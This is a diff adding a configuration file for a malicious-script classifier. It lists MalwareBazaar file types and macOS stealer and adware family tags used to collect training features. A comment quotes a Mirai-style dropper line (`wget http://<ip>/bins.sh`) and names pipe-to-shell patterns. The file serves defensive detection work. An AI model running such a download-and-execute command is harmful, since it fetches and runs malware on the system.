@@ -1,0 +1,17 @@
+# Positives of the script classifier (`python -m ml.train --kind script`): MalwareBazaar queries.
+# `get_file_type` values and `get_taginfo` tags; unknown values just return no result. Only the
+# features of the samples are kept (never the samples), see ml/samples.py.
+#
+# Caveat: the generic script file types (`sh` above all) are dominated by Linux IoT droppers
+# (Mirai-style `wget http://<ip>/bins.sh`). They are still malicious scripts and teach download /
+# chmod / pipe-to-shell patterns, but the family-aware weighting (1/sqrt(family size)) keeps one
+# family from dictating the model; macOS-specific samples come mostly from the tag queries.
+
+[malwarebazaar]
+file_types = ["sh", "bash", "zsh", "applescript", "scpt", "py", "js", "pl", "command"]
+tags = [
+  "AppleScript", "osascript", "scpt", "JXA", "ClickFix", "macOS", "OSX",
+  "AMOS", "AtomicStealer", "Atomic", "Poseidon", "PoseidonStealer", "Banshee", "BansheeStealer",
+  "Cuckoo", "CuckooStealer", "Odyssey", "OdysseyStealer", "MacSync", "Frigidstealer",
+  "Shlayer", "Bundlore", "Adload", "Pirrit",
+]
